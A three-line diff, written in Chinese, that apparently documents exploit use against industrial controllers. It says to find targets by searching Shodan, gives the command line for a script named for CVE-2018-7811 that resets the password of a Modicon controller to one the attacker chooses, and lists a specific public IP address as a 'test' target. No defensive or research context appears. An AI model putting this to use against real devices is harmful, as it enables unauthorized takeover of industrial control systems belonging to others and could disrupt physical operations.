@@ -1,0 +1,3 @@
+验证方法：shodan实操
+exp使用方法：python cve_2018_7811_modicon_pass_reset.py <target_ip> <target_port><target_user><new_pass>
+测试ip：62.169.77.149
